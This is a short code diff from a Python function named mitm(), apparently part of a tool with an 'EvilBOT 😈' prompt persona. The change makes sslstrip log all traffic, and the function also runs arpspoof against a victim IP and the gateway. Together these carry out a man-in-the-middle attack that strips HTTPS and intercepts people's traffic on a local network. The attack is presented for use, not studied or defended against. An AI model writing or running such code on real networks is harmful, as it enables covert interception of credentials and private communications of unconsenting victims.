@@ -35,7 +35,8 @@ def mitm():
     interface: str = input("<EvilBOT 😈>: Enter name of network interface to use: ")
 
     # Start SSLstrip to strip HTTPS encryption
-    sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface, '-a'], stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE)
 
     # Use arpspoof to perform ARP spoofing
     arpspoof_process = subprocess.Popen(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip],
